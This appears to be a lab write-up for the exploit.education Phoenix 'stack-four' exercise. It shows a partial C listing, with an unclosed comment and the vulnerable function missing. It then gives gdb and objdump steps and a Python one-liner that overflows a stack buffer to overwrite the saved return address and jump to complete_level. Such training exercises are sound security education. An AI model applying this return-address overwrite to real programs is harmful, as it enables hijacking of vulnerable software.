# Stack-Four

## Code

```
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");

}
```

## Solution

```
objdump -d stack-four | grep complete_level
python -c 'print("A"*64)' >> ~/asdf
gdb stack-four
run < ~/asdf    # We get that the return address is "0x804855c"
x/100w $esp-40  # As you see the distance between the last 41 (A) and the return address is 16
python -c 'import struct; print("A"*64 + "B"*16 + struct.pack("I",0x080484e5))' | ./stack-four
```
